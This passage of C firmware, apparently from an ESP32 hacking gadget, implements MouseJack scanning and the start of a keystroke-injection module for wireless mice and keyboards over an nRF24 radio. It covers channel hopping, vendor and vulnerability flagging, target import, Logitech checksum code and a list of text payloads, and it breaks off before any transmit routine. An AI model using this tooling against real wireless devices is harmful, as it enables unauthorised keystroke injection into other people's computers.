      oldestMs = MouseJack_s_devices[i].lastSeenMs;
      oldest = i;
    }
  }
  return oldest;
}

static void MouseJack_mjNoteDevice(const uint8_t* addr, uint8_t ch,
                                   MouseJack_MjVendor vendor, bool vulnerable) {
  int idx = MouseJack_mjFindDevice(addr);
  const bool isNew = (idx < 0);
  if (isNew) {
    idx = MouseJack_mjAllocDevice();
    if (idx < 0) {
      return;
    }
    memset(&MouseJack_s_devices[idx], 0, sizeof(MouseJack_MjDevice));
    memcpy(MouseJack_s_devices[idx].addr, addr, 5);
    MouseJack_s_devices[idx].used = true;
    MouseJack_s_devices[idx].hits = 0;
  }

  MouseJack_s_devices[idx].hits++;
  MouseJack_s_devices[idx].lastCh = ch;
  MouseJack_s_devices[idx].lastSeenMs = sys_monotonic_ms();
  if (vendor != MouseJack_MjVendor_Unknown) {
    MouseJack_s_devices[idx].vendor = vendor;
  }
  if (vulnerable) {
    MouseJack_s_devices[idx].vulnerable = true;
  }

  MouseJack_mjRebuildCounts();
  MouseJack_s_mjStatusDirty = true;
  if (isNew || vulnerable || (MouseJack_s_devices[idx].hits % 8) == 0) {
    MouseJack_s_mjListDirty = true;
  }
  mjSharedPublish(MouseJack_s_devices[idx].addr,
                  MouseJack_s_devices[idx].lastCh,
                  MouseJack_s_devices[idx].vulnerable,
                  MouseJack_mjVendorName(MouseJack_s_devices[idx].vendor));
}

// Build a stable pseudo-address from payload fingerprint for tracking.
static void MouseJack_mjDeriveAddr(const uint8_t* p, int len, uint8_t out[5]) {
  // Prefer bytes that look like address remnants after a 0x55 prefix match.
  if (len >= 5) {
    out[0] = p[0];
    out[1] = p[1];
    out[2] = p[2];
    out[3] = p[3];
    out[4] = p[4];
    // Avoid all-identical garbage addresses.
    if (!(out[0] == out[1] && out[1] == out[2] && out[2] == out[3] &&
          out[3] == out[4])) {
      return;
    }
  }
  uint32_t h = 2166136261u;
  for (int i = 0; i < len; i++) {
    h ^= p[i];
    h *= 16777619u;
  }
  out[0] = (uint8_t)(h >> 24);
  out[1] = (uint8_t)(h >> 16);
  out[2] = (uint8_t)(h >> 8);
  out[3] = (uint8_t)(h);
  out[4] = (uint8_t)(len ^ p[0]);
}

static bool MouseJack_mjRxAvailable(void) {
  return (MouseJack_mjGetRegister(_MJ_STATUS) & 0x40) != 0;
}

static void MouseJack_mjReadPacket(void) {
  uint8_t payload[MouseJack_kMjPayloadMax];
  spi_device_select(&(MouseJack_radio_transport));
  spi_device_transfer(&(MouseJack_radio_transport), 0x61);
  for (int i = 0; i < MouseJack_kMjPayloadMax; i++) {
    payload[i] = spi_device_transfer(&(MouseJack_radio_transport), 0xFF);
  }
  spi_device_deselect(&(MouseJack_radio_transport));
  MouseJack_mjSetRegister(_MJ_STATUS, 0x70);

  const int len = MouseJack_mjTrimLen(payload, MouseJack_kMjPayloadMax);
  if (!MouseJack_mjPayloadInteresting(payload, len)) {
    return;
  }

  MouseJack_s_packetTotal++;
  MouseJack_MjVendor vendor;
  bool vulnerable;
  MouseJack_mjClassify(payload, len, &(vendor), &(vulnerable));

  uint8_t addr[5];
  MouseJack_mjDeriveAddr(payload, len, addr);
  MouseJack_mjNoteDevice(addr, MouseJack_s_channel, vendor, vulnerable);
  MouseJack_s_mjStatusDirty = true;
}

static void MouseJack_mjPollPackets(void) {
  uint8_t guard = 0;
  while (MouseJack_scanning && !MouseJack_s_paused &&
         MouseJack_mjRxAvailable() && guard < 8) {
    MouseJack_mjReadPacket();
    guard++;
  }
}

static void MouseJack_mjExpireDevices(void) {
  const uint32_t now = sys_monotonic_ms();
  bool changed = false;
  for (int i = 0; i < MouseJack_kMjMaxDevices; i++) {
    if (MouseJack_s_devices[i].used &&
        (now - MouseJack_s_devices[i].lastSeenMs) >
            MouseJack_kMjDeviceTimeoutMs) {
      MouseJack_s_devices[i].used = false;
      changed = true;
    }
  }
  if (changed) {
    MouseJack_mjRebuildCounts();
    MouseJack_s_mjListDirty = true;
    MouseJack_s_mjStatusDirty = true;
  }
}

static void MouseJack_mjStepHop(void) {
  if (MouseJack_s_paused) {
    return;
  }
  const uint32_t now = sys_monotonic_ms();
  if (now - MouseJack_s_lastHopMs < MouseJack_kMjHopIntervalMs) {
    return;
  }
  MouseJack_s_lastHopMs = now;
  MouseJack_s_hopIndex = (MouseJack_s_hopIndex + 1) % MouseJack_kMjChannelCount;
  MouseJack_s_channel = MouseJack_kMjChannels[MouseJack_s_hopIndex];
  MouseJack_mjApplyChannel(MouseJack_s_channel);
  MouseJack_s_mjStatusDirty = true;
}

static void MouseJack_mjClearDevices(void) {
  for (int i = 0; i < MouseJack_kMjMaxDevices; i++) {
    MouseJack_s_devices[i].used = false;
  }
  MouseJack_s_packetTotal = 0;
  MouseJack_s_deviceCount = 0;
  MouseJack_s_vulnCount = 0;
  MouseJack_s_mjListDirty = true;
  MouseJack_s_mjStatusDirty = true;
  MouseJack_mjFlushUi(true);
  MouseJack_mjAppendLogLine(TEXT("[*] List cleared"), UI_DIM_TEXT);
  MouseJack_mjFlushUi(true);
}

static void MouseJack_mjTogglePause(void) {
  MouseJack_s_paused = !MouseJack_s_paused;
  if (MouseJack_s_paused) {
    MouseJack_mjDisable();
    MouseJack_mjAppendLogLine(TEXT("[*] Paused"), UI_WARN);
  } else {
    MouseJack_mjEnable();
    MouseJack_mjAppendLogLine(TEXT("[+] Scanning"), UI_OK);
  }
  MouseJack_s_mjStatusDirty = true;
  MouseJack_mjFlushUi(true);
}

static unsigned long MouseJack_s_mjLastBtnMs = 0;
static const unsigned long MouseJack_kMjNavDebounceMs = 80;

static void MouseJack_mjWaitNavRelease(int pin) {
  const uint32_t t0 = sys_monotonic_ms();
  while (isTouchNavButtonPressed(pin) && sys_monotonic_ms() - t0 < 400) {
    sys_sleep_ms(5);
  }
  sys_sleep_ms(30);
}

void MouseJack_mouseJackHandleNavButtons(void) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  const uint32_t now = sys_monotonic_ms();
  if (now - MouseJack_s_mjLastBtnMs < MouseJack_kMjNavDebounceMs) {
    return;
  }
  if (isTouchNavButtonPressedEdge(BTN_LEFT)) {
    MouseJack_mjClearDevices();
    MouseJack_s_mjLastBtnMs = sys_monotonic_ms();
    MouseJack_mjWaitNavRelease(BTN_LEFT);
    return;
  }
  if (isTouchNavButtonPressedEdge(BTN_DOWN)) {
    MouseJack_mjTogglePause();
    MouseJack_s_mjLastBtnMs = sys_monotonic_ms();
    MouseJack_mjWaitNavRelease(BTN_DOWN);
  }
}

void MouseJack_runUI(void) {
  enum { kBarY = 20 };
  enum { kBarH = 16 };
  enum { kIconSz = 16 };
  enum { kIconN = 3 };
  // Same 3-icon spacing as Scanner: 170 / 210 / 10.
  static int iconX[kIconN] = {170, 210, 10};
  static int iconY = kBarY;

  static const unsigned char* icons[kIconN] = {
      bitmap_icon_undo, bitmap_icon_start, bitmap_icon_go_back};

  if (!MouseJack_uiDrawn) {
    display_fill_rect(&(tft), 0, kBarY, 240, kBarH, DARK_GRAY);
    for (int i = 0; i < kIconN; i++) {
      if (icons[i] != NULL) {
        display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], kIconSz, kIconSz,
                            UI_ICON);
      }
    }
    display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
    display_draw_fast_h_line(&(tft), 0, kBarY + kBarH, 240, UI_LINE);
    MouseJack_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && sys_monotonic_ms() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      display_draw_bitmap(&(tft), iconX[activeIcon], iconY, icons[activeIcon],
                          kIconSz, kIconSz, UI_ICON);
      animationState = 2;
      switch (activeIcon) {
        case 0:
          MouseJack_mjClearDevices();
          break;
        case 1:
          MouseJack_mjTogglePause();
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = sys_monotonic_ms();
  }

  static unsigned long lastTouchCheck = 0;
  if (sys_monotonic_ms() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > kBarY && y < kBarY + kBarH) {
        for (int i = 0; i < kIconN; i++) {
          if (x > iconX[i] && x < iconX[i] + kIconSz) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 2) {
                feature_exit_requested = true;
                MouseJack_scanning = false;
              } else {
                display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], kIconSz,
                                    kIconSz, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = sys_monotonic_ms();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

void MouseJack_mouseJackSetup(void) {
  setTouchButtonInputEnabled(true);
  bleSetMouseJackNavLabels();
  bleClearBody(TFT_BLACK);

  MouseJack_uiDrawn = false;
  MouseJack_scanning = true;
  MouseJack_s_paused = false;
  MouseJack_s_channel = MouseJack_kMjChannels[0];
  MouseJack_s_hopIndex = 0;
  MouseJack_s_lastHopMs = sys_monotonic_ms();
  MouseJack_s_packetTotal = 0;
  MouseJack_s_deviceCount = 0;
  MouseJack_s_vulnCount = 0;
  MouseJack_s_logIndex = 0;
  MouseJack_s_mjLogDirty = false;
  MouseJack_s_mjStatusDirty = false;
  MouseJack_s_mjListDirty = false;
  MouseJack_s_mjLastUiMs = 0;
  for (int i = 0; i < MouseJack_kMjMaxDevices; i++) {
    MouseJack_s_devices[i].used = false;
  }
  for (int i = 0; i < MouseJack_kMjMaxLogLines; i++) {
    MouseJack_s_logBuffer[i] = TEXT("");
    MouseJack_s_logColor[i] = UI_DIM_TEXT;
    MouseJack_s_logDrawn[i] = TEXT("");
    MouseJack_s_logDrawnColor[i] = 0;
    MouseJack_s_logDrawnW[i] = 0;
  }
  for (int i = 0; i < MouseJack_kMjStatusLines; i++) {
    MouseJack_s_statusText[i] = TEXT("");
    MouseJack_s_statusColor[i] = 0;
    MouseJack_s_statusDrawnW[i] = 0;
  }

  float v = readBatteryVoltage();
  drawStatusBar(v, true, false);
  redrawTouchButtonBar();

  MouseJack_runUI();
  MouseJack_mjDrawTextBoxes();
  MouseJack_mjAppendLogLine(TEXT("[+] MouseJack Scan ready"), UI_WARN);
  MouseJack_mjAppendLogLine(TEXT("[*] Hopping Unifying channels"), UI_DIM_TEXT);
  MouseJack_s_mjStatusDirty = true;
  MouseJack_mjFlushUi(true);
  redrawTouchButtonBar();

  setupTouchscreen();
  sys_configure_gpio(CE, GPIO_MODE_OUTPUT);
  sys_configure_gpio(CSN, GPIO_MODE_OUTPUT);
  MouseJack_mjInitRadioSpi();
  MouseJack_mjConfigureRadio();
  redrawTouchButtonBar();
}

void MouseJack_mouseJackLoop(void) {
  MouseJack_scanning = true;
  while (MouseJack_scanning) {
    if (feature_active &&
        (feature_exit_requested || featureExitButtonPressed())) {
      feature_exit_requested = true;
      MouseJack_scanning = false;
      break;
    }

    MouseJack_mouseJackHandleNavButtons();
    maintainTouchNavBar();
    MouseJack_runUI();
    MouseJack_mjStepHop();
    MouseJack_mjPollPackets();
    MouseJack_mjExpireDevices();
    MouseJack_mjFlushUi(false);
    sys_sleep_ms(1);
  }
}

void MouseJack_exit(void) {
  MouseJack_scanning = false;
  MouseJack_mjDisable();
  MouseJack_mjPowerDown();
  spi_device_deselect(&(MouseJack_radio_transport));
  refreshSdMount();
}

static spi_device_t MouseJackInject_radio_transport;

#undef CE
#define CE NRF24_SCAN_CE
#undef CSN
#define CSN NRF24_SCAN_CSN

void MouseJackInject_runUI(void);

#undef _INJ_CONFIG
#define _INJ_CONFIG 0x00
#undef _INJ_EN_AA
#define _INJ_EN_AA 0x01
#undef _INJ_EN_RXADDR
#define _INJ_EN_RXADDR 0x02
#undef _INJ_SETUP_AW
#define _INJ_SETUP_AW 0x03
#undef _INJ_SETUP_RETR
#define _INJ_SETUP_RETR 0x04
#undef _INJ_RF_CH
#define _INJ_RF_CH 0x05
#undef _INJ_RF_SETUP
#define _INJ_RF_SETUP 0x06
#undef _INJ_STATUS
#define _INJ_STATUS 0x07
#undef _INJ_RX_ADDR_P0
#define _INJ_RX_ADDR_P0 0x0A
#undef _INJ_TX_ADDR
#define _INJ_TX_ADDR 0x10
#undef _INJ_RX_PW_P0
#define _INJ_RX_PW_P0 0x11

enum { MouseJackInject_kInjPayloadMax = 32 };
enum { MouseJackInject_kInjMaxTargets = kMjSharedMax };
enum { MouseJackInject_kInjMaxLogLines = 14 };
enum { MouseJackInject_kInjStatusLines = 4 };
enum { MouseJackInject_kInjLineHeight = 12 };
enum { MouseJackInject_kInjToolbarBottom = 36 };
enum { MouseJackInject_kInjToolbarGap = 8 };
enum {
  MouseJackInject_kInjStatusY = MouseJackInject_kInjToolbarBottom +
  MouseJackInject_kInjToolbarGap
};
enum { MouseJackInject_kInjBoxHeaderH = 15 };
enum {
  MouseJackInject_kInjStatusTextY = MouseJackInject_kInjStatusY +
  MouseJackInject_kInjBoxHeaderH
};
enum {
  MouseJackInject_kInjStatusBoxH = MouseJackInject_kInjBoxHeaderH +
  (MouseJackInject_kInjStatusLines * MouseJackInject_kInjLineHeight) + 4
};
enum { MouseJackInject_kInjLogGap = 4 };
enum {
  MouseJackInject_kInjLogBoxTop = MouseJackInject_kInjStatusY +
  MouseJackInject_kInjStatusBoxH + MouseJackInject_kInjLogGap
};
enum {
  MouseJackInject_kInjLogStartY = MouseJackInject_kInjLogBoxTop +
  MouseJackInject_kInjBoxHeaderH
};
enum { MouseJackInject_kInjLogBottomPad = 4 };
enum { MouseJackInject_kInjUiMinIntervalMs = 100 };
enum { MouseJackInject_kInjHopIntervalMs = 50 };
enum { MouseJackInject_kInjKeyDelayMs = 12 };

static const uint8_t MouseJackInject_kInjChannels[] = {
    2,  3,  4,  5,  6,  7,  8,  9,  10, 11, 12, 13, 14, 15, 16, 17,
    18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 32, 35, 40, 42,
    46, 50, 52, 55, 60, 62, 65, 68, 70, 72, 74, 76, 78, 80, 82};
enum {
  MouseJackInject_kInjChannelCount = sizeof(MouseJackInject_kInjChannels) /
  sizeof(MouseJackInject_kInjChannels[0])
};

typedef struct MouseJackInject_InjTarget {
  uint8_t addr[5];
  uint8_t channel;
  bool used;
  bool vulnerable;
  char vendor[12];
} MouseJackInject_InjTarget;
#define MouseJackInject_InjTarget_INITIALIZER {0}
;

static const char* MouseJackInject_kPayloads[] = {
    "hello", "Hello World!", "test123", "ESP32-DIV", "CiferTech", "admin",
};
enum {
  MouseJackInject_kPayloadCount = sizeof(MouseJackInject_kPayloads) /
  sizeof(MouseJackInject_kPayloads[0])
};

static bool MouseJackInject_uiDrawn = false;
static volatile bool MouseJackInject_s_active = false;
static bool MouseJackInject_s_scanning = false;
static bool MouseJackInject_s_injecting = false;
static uint8_t MouseJackInject_s_channel = 2;
static int MouseJackInject_s_hopIndex = 0;
static uint32_t MouseJackInject_s_lastHopMs = 0;
static int MouseJackInject_s_prefixByte = 0;
static int MouseJackInject_s_targetIndex = 0;
static int MouseJackInject_s_targetCount = 0;
static int MouseJackInject_s_payloadIndex = 0;
static uint32_t MouseJackInject_s_injectCount = 0;

static MouseJackInject_InjTarget
    MouseJackInject_s_targets[MouseJackInject_kInjMaxTargets];

enum {
  MouseJackInject_s_logBuffer_COUNT = MouseJackInject_kInjMaxLogLines,
  MouseJackInject_s_logBuffer_OFFSET = 0
};
_Static_assert(MouseJackInject_s_logBuffer_OFFSET +
                       MouseJackInject_s_logBuffer_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define MouseJackInject_s_logBuffer                  \
  (*(text_t(*)[MouseJackInject_s_logBuffer_COUNT]) & \
   feature_text_slots[MouseJackInject_s_logBuffer_OFFSET])
static uint16_t MouseJackInject_s_logColor[MouseJackInject_kInjMaxLogLines];
static int MouseJackInject_s_logIndex = 0;
enum {
  MouseJackInject_s_logDrawn_COUNT = MouseJackInject_kInjMaxLogLines,
  MouseJackInject_s_logDrawn_OFFSET = MouseJackInject_s_logBuffer_OFFSET +
      MouseJackInject_s_logBuffer_COUNT
};
_Static_assert(MouseJackInject_s_logDrawn_OFFSET +
                       MouseJackInject_s_logDrawn_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define MouseJackInject_s_logDrawn                  \
  (*(text_t(*)[MouseJackInject_s_logDrawn_COUNT]) & \
   feature_text_slots[MouseJackInject_s_logDrawn_OFFSET])
static uint16_t
    MouseJackInject_s_logDrawnColor[MouseJackInject_kInjMaxLogLines];
static int MouseJackInject_s_logDrawnW[MouseJackInject_kInjMaxLogLines];

enum {
  MouseJackInject_s_statusText_COUNT = MouseJackInject_kInjStatusLines,
  MouseJackInject_s_statusText_OFFSET = MouseJackInject_s_logDrawn_OFFSET +
      MouseJackInject_s_logDrawn_COUNT
};
_Static_assert(MouseJackInject_s_statusText_OFFSET +
                       MouseJackInject_s_statusText_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define MouseJackInject_s_statusText                  \
  (*(text_t(*)[MouseJackInject_s_statusText_COUNT]) & \
   feature_text_slots[MouseJackInject_s_statusText_OFFSET])
static uint16_t MouseJackInject_s_statusColor[MouseJackInject_kInjStatusLines];
static int MouseJackInject_s_statusDrawnW[MouseJackInject_kInjStatusLines];

static bool MouseJackInject_s_logDirty = false;
static bool MouseJackInject_s_statusDirty = false;
static uint32_t MouseJackInject_s_lastUiMs = 0;

static int MouseJackInject_injLogBoxBottom(void) {
  return bleContentBottom() - MouseJackInject_kInjLogBottomPad;
}
static int MouseJackInject_injLogBoxH(void) {
  const int h =
      MouseJackInject_injLogBoxBottom() - MouseJackInject_kInjLogBoxTop;
  return h > (MouseJackInject_kInjBoxHeaderH + MouseJackInject_kInjLineHeight)
             ? h
             : (MouseJackInject_kInjBoxHeaderH +
                MouseJackInject_kInjLineHeight);
}
static int MouseJackInject_injLogEndY(void) {
  return MouseJackInject_kInjLogBoxTop + MouseJackInject_injLogBoxH() - 2;
}
static int MouseJackInject_injVisibleLogLines(void) {
  const int avail =
      MouseJackInject_injLogEndY() - MouseJackInject_kInjLogStartY;
  if (avail <= 0) return 1;
  const int n = avail / MouseJackInject_kInjLineHeight;
  return n < 1 ? 1
               : (n > MouseJackInject_kInjMaxLogLines
                      ? MouseJackInject_kInjMaxLogLines
                      : n);
}

static uint8_t MouseJackInject_injGetRegister(uint8_t r) {
  uint8_t c;
  spi_device_select(&(MouseJackInject_radio_transport));
  spi_device_transfer(&(MouseJackInject_radio_transport), r & 0x1F);
  c = spi_device_transfer(&(MouseJackInject_radio_transport), 0);
  spi_device_deselect(&(MouseJackInject_radio_transport));
  return c;
}

static void MouseJackInject_injSetRegister(uint8_t r, uint8_t v) {
  spi_device_select(&(MouseJackInject_radio_transport));
  spi_device_transfer(&(MouseJackInject_radio_transport), (r & 0x1F) | 0x20);
  spi_device_transfer(&(MouseJackInject_radio_transport), v);
  spi_device_deselect(&(MouseJackInject_radio_transport));
}

static void MouseJackInject_injWriteRegMulti(uint8_t reg, const uint8_t* data,
                                             uint8_t len) {
  spi_device_select(&(MouseJackInject_radio_transport));
  spi_device_transfer(&(MouseJackInject_radio_transport), (reg & 0x1F) | 0x20);
  for (uint8_t i = 0; i < len; i++)
    spi_device_transfer(&(MouseJackInject_radio_transport), data[i]);
  spi_device_deselect(&(MouseJackInject_radio_transport));
}

static void MouseJackInject_injDisable(void) {
  gpio_set_level(((gpio_num_t)(CE)), 0);
}
static void MouseJackInject_injEnable(void) {
  gpio_set_level(((gpio_num_t)(CE)), 1);
}

static void MouseJackInject_injPowerUp(void) {
  MouseJackInject_injSetRegister(
      _INJ_CONFIG, MouseJackInject_injGetRegister(_INJ_CONFIG) | 0x02);
  esp_rom_delay_us(130);
}

static void MouseJackInject_injPowerDown(void) {
  MouseJackInject_injSetRegister(
      _INJ_CONFIG, MouseJackInject_injGetRegister(_INJ_CONFIG) & ~0x02);
}

static void MouseJackInject_injFlushRx(void) {
  spi_device_select(&(MouseJackInject_radio_transport));
  spi_device_transfer(&(MouseJackInject_radio_transport), 0xE2);
  spi_device_deselect(&(MouseJackInject_radio_transport));
}

static void MouseJackInject_injFlushTx(void) {
  spi_device_select(&(MouseJackInject_radio_transport));
  spi_device_transfer(&(MouseJackInject_radio_transport), 0xE1);
  spi_device_deselect(&(MouseJackInject_radio_transport));
}

static void MouseJackInject_injInitSpi(void) {
  spi_device_init(&(MouseJackInject_radio_transport), DIV_SD_HOST, SD_SCLK,
                  SD_MISO, SD_MOSI, CSN, 8000000, false);
}

static uint8_t MouseJackInject_injLogitechChecksum(const uint8_t* p, int len) {
  uint8_t ck = 0xFF;
  for (int i = 0; i < len - 1; i++) {
    ck = (uint8_t)((ck - p[i]) & 0xFF);
  }
  return (uint8_t)((ck + 1) & 0xFF);
}

static bool MouseJackInject_injLooksLikeLogitech(const uint8_t* p, int len) {
  if (len < 6 || len > 22) return false;
  return MouseJackInject_injLogitechChecksum(p, len) == p[len - 1];
}

enum { MouseJackInject_kInjStatPadX = 10 };
enum { MouseJackInject_kInjStatValueX = 70 };
enum { MouseJackInject_kInjStatTextDy = 2 };

static void MouseJackInject_injPaintTextLine(int x, int y, int maxW, int lineH,
                                             text_t* cacheText,
                                             uint16_t* cacheColor, int* cacheW,
                                             text_t text, uint16_t color) {
  if ((strcmp(((*cacheText)).data, (text).data) == 0) && (*cacheColor) == color)
    return;
  display_set_text_datum(&(tft), TL_DATUM);
  display_set_text_size(&(tft), 1);
  const int newW = strlen((text).data)
                       ? (display_text_width(&(tft), (text).data, 0) + 2)
                       : 0;
  int clearW = (*cacheW) > newW ? (*cacheW) : newW;
  if (clearW < 8) clearW = maxW;
  if (clearW > maxW) clearW = maxW;
  display_fill_rect(&(tft), x, y, clearW, lineH, TFT_BLACK);
  if (strlen((text).data)) {
    display_set_text_color_2(&(tft), color, TFT_BLACK);
    display_set_cursor(&(tft), x, y + MouseJackInject_kInjStatTextDy);
    display_print(&(tft), (text).data);
  }
  (*cacheText) = text;
  (*cacheColor) = color;
  (*cacheW) = newW > 0 ? newW : 0;
}

static void MouseJackInject_injAppendLog(text_t text, uint16_t color) {
  const int visible = MouseJackInject_injVisibleLogLines();
  for (int i = visible - 1; i > 0; i--) {
    MouseJackInject_s_logBuffer[i] = MouseJackInject_s_logBuffer[i - 1];
    MouseJackInject_s_logColor[i] = MouseJackInject_s_logColor[i - 1];
  }
  MouseJackInject_s_logBuffer[0] = text;
  MouseJackInject_s_logColor[0] = color;
  if (MouseJackInject_s_logIndex < visible) MouseJackInject_s_logIndex++;
  MouseJackInject_s_logDirty = true;
}

static void MouseJackInject_injRedrawLog(void) {
  const int endY = MouseJackInject_injLogEndY();
  const int visible = MouseJackInject_injVisibleLogLines();
  const int maxW = display_width(&(tft)) - 16;
  display_set_text_datum(&(tft), TL_DATUM);
  for (int i = 0; i < visible; i++) {
    const int y =
        MouseJackInject_kInjLogStartY + i * MouseJackInject_kInjLineHeight;
    if (y + MouseJackInject_kInjLineHeight > endY) break;
    if (i < MouseJackInject_s_logIndex) {
      MouseJackInject_injPaintTextLine(
          MouseJackInject_kInjStatPadX, y, maxW, MouseJackInject_kInjLineHeight,
          &(MouseJackInject_s_logDrawn[i]),
          &(MouseJackInject_s_logDrawnColor[i]),
          &(MouseJackInject_s_logDrawnW[i]), MouseJackInject_s_logBuffer[i],
          MouseJackInject_s_logColor[i]);
    } else {
      MouseJackInject_injPaintTextLine(
          MouseJackInject_kInjStatPadX, y, maxW, MouseJackInject_kInjLineHeight,
          &(MouseJackInject_s_logDrawn[i]),
          &(MouseJackInject_s_logDrawnColor[i]),
          &(MouseJackInject_s_logDrawnW[i]), TEXT(""), UI_DIM_TEXT);
    }
  }
  MouseJackInject_s_logDirty = false;
}

static void MouseJackInject_injDrawStatusValue(int line, text_t text,
                                               uint16_t color) {
  if (line < 0 || line >= MouseJackInject_kInjStatusLines) return;
  const int y =
      MouseJackInject_kInjStatusTextY + line * MouseJackInject_kInjLineHeight;
  const int maxW = display_width(&(tft)) - MouseJackInject_kInjStatValueX - 8;
  MouseJackInject_injPaintTextLine(
      MouseJackInject_kInjStatValueX, y, maxW, MouseJackInject_kInjLineHeight,
      &(MouseJackInject_s_statusText[line]),
      &(MouseJackInject_s_statusColor[line]),
      &(MouseJackInject_s_statusDrawnW[line]), text, color);
}

static text_t MouseJackInject_injAddrStr(const uint8_t* a) {
  char buf[16];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X", a[0], a[1], a[2], a[3],
           a[4]);
  return TEXT(buf);
}

static void MouseJackInject_injUpdateStatusPanel(void) {
  if (MouseJackInject_s_targetCount > 0 && MouseJackInject_s_targetIndex >= 0 &&
      MouseJackInject_s_targetIndex < MouseJackInject_s_targetCount) {
    __auto_type t = &(MouseJackInject_s_targets[MouseJackInject_s_targetIndex]);
    char tgt[48];
    snprintf(tgt, sizeof(tgt), "%d/%d %.14s", MouseJackInject_s_targetIndex + 1,
             MouseJackInject_s_targetCount,
             (MouseJackInject_injAddrStr((*t).addr)).data);
    text_t s = TEXT(tgt);
    if (strlen((s).data) > 22) s = text_slice(s, 0, 22);
    MouseJackInject_injDrawStatusValue(0, s,
                                       (*t).vulnerable ? UI_WARN : UI_TEXT);

    char chLine[28];
    snprintf(chLine, sizeof(chLine), "%u  %s%s", (unsigned)(*t).channel,
             (*t).vendor, (*t).vulnerable ? " VULN" : "");
    MouseJackInject_injDrawStatusValue(1, TEXT(chLine),
                                       (*t).vulnerable ? UI_WARN : UI_DIM_TEXT);
  } else {
    MouseJackInject_injDrawStatusValue(0, TEXT("none — run Scan"), UI_DIM_TEXT);
    MouseJackInject_injDrawStatusValue(1, TEXT("from Scan / rescan"),
                                       UI_DIM_TEXT);
  }

  text_t pay = TEXT(MouseJackInject_kPayloads[MouseJackInject_s_payloadIndex]);
  if (strlen((pay).data) > 20) pay = text_slice(pay, 0, 20);
  MouseJackInject_injDrawStatusValue(2, pay, UI_TEXT);

  if (MouseJackInject_s_injecting) {
    MouseJackInject_injDrawStatusValue(3, TEXT("Injecting..."), UI_WARN);
  } else if (MouseJackInject_s_scanning) {
    char b[28];
    snprintf(b, sizeof(b), "Scan ch%u p%02X",
             (unsigned)MouseJackInject_s_channel,
             (unsigned)MouseJackInject_s_prefixByte);
    MouseJackInject_injDrawStatusValue(3, TEXT(b), ORANGE);
  } else {
    MouseJackInject_injDrawStatusValue(3, TEXT("Ready"), UI_OK);
  }
  MouseJackInject_s_statusDirty = false;
}

static void MouseJackInject_injDrawTextBoxes(void) {
  const int logH = MouseJackInject_injLogBoxH();
  const int endY = MouseJackInject_injLogEndY();
  display_fill_rect(&(tft), 0, MouseJackInject_kInjStatusY - 2,
                    display_width(&(tft)),
                    endY - MouseJackInject_kInjStatusY + 4, TFT_BLACK);
  display_draw_fast_h_line(&(tft), 0, 19, display_width(&(tft)), UI_LINE);
  display_draw_round_rect(&(tft), 4, MouseJackInject_kInjStatusY,
                          display_width(&(tft)) - 8,
                          MouseJackInject_kInjStatusBoxH, 3, UI_LINE);
  display_draw_round_rect(&(tft), 4, MouseJackInject_kInjLogBoxTop,
                          display_width(&(tft)) - 8, logH, 3, UI_LINE);

  display_set_text_datum(&(tft), TL_DATUM);
  display_set_text_size(&(tft), 1);
  display_set_text_color_2(&(tft), UI_DIM_TEXT, TFT_BLACK);
  display_set_cursor(&(tft), MouseJackInject_kInjStatPadX,
                     MouseJackInject_kInjStatusY + 3);
  display_print(&(tft), "Inject");
  display_set_cursor(&(tft), MouseJackInject_kInjStatPadX,
                     MouseJackInject_kInjLogBoxTop + 3);
  display_print(&(tft), "Activity");

  static const char* kLabels[MouseJackInject_kInjStatusLines] = {
      "Target", "Ch", "Payload", "State"};
  for (int i = 0; i < MouseJackInject_kInjStatusLines; i++) {
    const int y = MouseJackInject_kInjStatusTextY +
                  i * MouseJackInject_kInjLineHeight +
                  MouseJackInject_kInjStatTextDy;
    display_set_text_color_2(&(tft), UI_DIM_TEXT, TFT_BLACK);
    display_set_cursor(&(tft), MouseJackInject_kInjStatPadX, y);
    display_print(&(tft), (TEXT(kLabels[i])).data);
    MouseJackInject_s_statusText[i] = TEXT("");
    MouseJackInject_s_statusColor[i] = 0;
    MouseJackInject_s_statusDrawnW[i] = 0;
  }
  for (int i = 0; i < MouseJackInject_kInjMaxLogLines; i++) {
    MouseJackInject_s_logDrawn[i] = TEXT("");
    MouseJackInject_s_logDrawnColor[i] = 0;
    MouseJackInject_s_logDrawnW[i] = 0;
  }
}

static void MouseJackInject_injFlushUi(bool force) {
  const uint32_t now = sys_monotonic_ms();
  if (!force &&
      (now - MouseJackInject_s_lastUiMs) < MouseJackInject_kInjUiMinIntervalMs)
    return;
  if (!force && !MouseJackInject_s_logDirty && !MouseJackInject_s_statusDirty)
    return;
  MouseJackInject_s_lastUiMs = now;
  if (MouseJackInject_s_statusDirty || force)
    MouseJackInject_injUpdateStatusPanel();
  if (MouseJackInject_s_logDirty || force) MouseJackInject_injRedrawLog();
}

static void MouseJackInject_injImportShared(void) {
  MouseJackInject_s_targetCount = 0;
  for (int i = 0; i < kMjSharedMax && MouseJackInject_s_targetCount <
                                          MouseJackInject_kInjMaxTargets;
       i++) {
    if (!g_mjShared[i].used) continue;
    __auto_type t = &(MouseJackInject_s_targets[MouseJackInject_s_targetCount]);
    memcpy((*t).addr, g_mjShared[i].addr, 5);
    (*t).channel = g_mjShared[i].channel;
    (*t).vulnerable = g_mjShared[i].vulnerable;
    (*t).used = true;
    strncpy((*t).vendor, g_mjShared[i].vendor, sizeof((*t).vendor) - 1);
